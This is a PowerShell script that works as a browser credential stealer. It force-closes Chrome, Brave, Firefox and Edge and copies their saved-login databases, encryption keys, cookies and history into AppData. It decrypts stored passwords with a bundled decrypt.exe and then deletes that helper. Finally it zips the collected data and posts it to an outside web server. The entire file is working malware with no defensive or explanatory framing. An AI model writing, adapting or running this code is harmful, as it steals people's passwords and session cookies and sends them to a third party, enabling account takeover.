# Set destination directory directly to AppData
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $profileName, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath "$browserName\$profileName"
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - Profile $profileName - File copied: $file"
        } else {
            Write-Host "$browserName - Profile $profileName - File not found: $file"
        }
    }
}

# Function to kill browser processes
function KillBrowserProcesses($browserName) {
    $processes = Get-Process | Where-Object { $_.Name -like "*$browserName*" }
    foreach ($process in $processes) {
        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "Killing process: $browserName with ID: $($process.Id)"
    }
}

# Function to decrypt Login Data for specific profile
function DecryptLoginData($browserName, $profileName) {
    $profileDir = Join-Path -Path $destDir -ChildPath "$browserName\$profileName"
    $decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
    $loginDataPath = Join-Path -Path $profileDir -ChildPath "Login Data"
    $localStatePath = Join-Path -Path $profileDir -ChildPath "Local State"
    $outputPath = Join-Path -Path $profileDir -ChildPath "output.txt"

    # Test-Path commands wrapped in parentheses
    if ((Test-Path $decryptExePath) -and (Test-Path $loginDataPath) -and (Test-Path $localStatePath)) {
        # Run the decrypt.exe with specified parameters and capture output
        $decryptCommand = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
        Write-Host "$browserName - $profileName - Decrypt.exe output: $decryptCommand"
        
        if (Test-Path $outputPath) {
            Write-Host "$browserName - $profileName - Decrypted passwords saved to: $outputPath"
        } else {
            Write-Host "$browserName - $profileName - Decrypted passwords not found."
        }
    } else {
        Write-Host "$browserName - $profileName - Required files not found for decryption."
    }
}

# Configuration for Google Chrome
$chromeProfiles = @("Default", "Profile 1", "Profile 2")
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeFilesToCopy = @("Login Data", "Local State")

KillBrowserProcesses "chrome"

foreach ($profile in $chromeProfiles) {
    $profileDir = Join-Path -Path $chromeDir -ChildPath $profile
    if (Test-Path $profileDir) {
        CopyBrowserFiles "Chrome" $profileDir $profile $chromeFilesToCopy
    } else {
        Write-Host "Chrome - Profile $profile not found."
    }
}

# Now copy Local State for each profile
$localStateSource = Join-Path -Path $chromeDir -ChildPath "Local State"
if (Test-Path $localStateSource) {
    foreach ($profile in $chromeProfiles) {
        $browserDestDir = Join-Path -Path $destDir -ChildPath "Chrome\$profile"
        Copy-Item -Path $localStateSource -Destination $browserDestDir -Force
        Write-Host "Chrome - Profile $profile - Local State copied."
    }
}

# Decrypt login data after copying
foreach ($profile in $chromeProfiles) {
    DecryptLoginData "Chrome" $profile
}

# Configuration for Brave
$braveProfiles = @("Default", "Profile 1", "Profile 2")
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
$braveFilesToCopy = @("Login Data", "Local State")

KillBrowserProcesses "brave"

foreach ($profile in $braveProfiles) {
    $profileDir = Join-Path -Path $braveDir -ChildPath $profile
    if (Test-Path $profileDir) {
        CopyBrowserFiles "Brave" $profileDir $profile $braveFilesToCopy
    } else {
        Write-Host "Brave - Profile $profile not found."
    }
}

# Now copy Local State for each profile in Brave
$braveLocalStateSource = Join-Path -Path $braveDir -ChildPath "Local State"
if (Test-Path $braveLocalStateSource) {
    foreach ($profile in $braveProfiles) {
        $browserDestDir = Join-Path -Path $destDir -ChildPath "Brave\$profile"
        Copy-Item -Path $braveLocalStateSource -Destination $browserDestDir -Force
        Write-Host "Brave - Profile $profile - Local State copied."
    }
}

# Decrypt login data after copying
foreach ($profile in $braveProfiles) {
    DecryptLoginData "Brave" $profile
}

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfiles = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release*"
$firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")

KillBrowserProcesses "firefox"

foreach ($profile in $firefoxProfiles) {
    $firefoxDir = $profile.FullName
    if (Test-Path $firefoxDir) {
        CopyBrowserFiles "Firefox" $firefoxDir $profile.Name $firefoxFilesToCopy
    } else {
        Write-Host "Firefox - Profile $profile.Name not found."
    }
}

# Configuration for Microsoft Edge
$edgeProfiles = @("Default", "Profile 1", "Profile 2")
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeFilesToCopy = @("Login Data", "Local State")

KillBrowserProcesses "msedge"

foreach ($profile in $edgeProfiles) {
    $profileDir = Join-Path -Path $edgeDir -ChildPath $profile
    if (Test-Path $profileDir) {
        CopyBrowserFiles "Edge" $profileDir $profile $edgeFilesToCopy
    } else {
        Write-Host "Edge - Profile $profile not found."
    }
}

# Now copy Local State for each profile in Edge
$edgeLocalStateSource = Join-Path -Path $edgeDir -ChildPath "Local State"
if (Test-Path $edgeLocalStateSource) {
    foreach ($profile in $edgeProfiles) {
        $browserDestDir = Join-Path -Path $destDir -ChildPath "Edge\$profile"
        Copy-Item -Path $edgeLocalStateSource -Destination $browserDestDir -Force
        Write-Host "Edge - Profile $profile - Local State copied."
    }
}

# Decrypt login data after copying
foreach ($profile in $edgeProfiles) {
    DecryptLoginData "Edge" $profile
}

# Delete decrypt.exe after use, before zipping
$decryptExe = "$env:APPDATA\BrowserData\Chrome\decrypt.exe"
if (Test-Path $decryptExe) {
    Remove-Item $decryptExe -Force
    Write-Host "decrypt.exe deleted before zipping."
}

# Zip the BrowserData folder
$zipDir = "$env:APPDATA\ZippedBrowserData"
if (-Not (Test-Path $zipDir)) {
    New-Item -ItemType Directory -Path $zipDir
}

$folderPath = $destDir
$zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"

if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
Write-Host "Browser data compressed into ZIP: $zipFilePath"

# Upload the ZIP file
$url = "https://alperen.cc/uploadd.php"
if (Test-Path $zipFilePath) {
    try {
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $contentType = "multipart/form-data; boundary=$boundary"
        $fileName = [System.IO.Path]::GetFileName($zipFilePath)
        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`nContent-Type: application/zip`r`n`r`n"
        $footer = "`r`n--$boundary--`r`n"
        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
        $bodyStream = New-Object System.IO.MemoryStream
        $writer = New-Object System.IO.StreamWriter $bodyStream
        $writer.Write($header)
        $writer.Flush()
        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
        $writer.Write($footer)
        $writer.Flush()
        $bodyStream.Position = 0
        $bodyBytes = $bodyStream.ToArray()
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType $contentType -ErrorAction Stop
        Write-Output $response
        $writer.Dispose()
        $bodyStream.Dispose()
    } catch {
        Write-Host "Error while uploading ZIP: $_"
    }
}
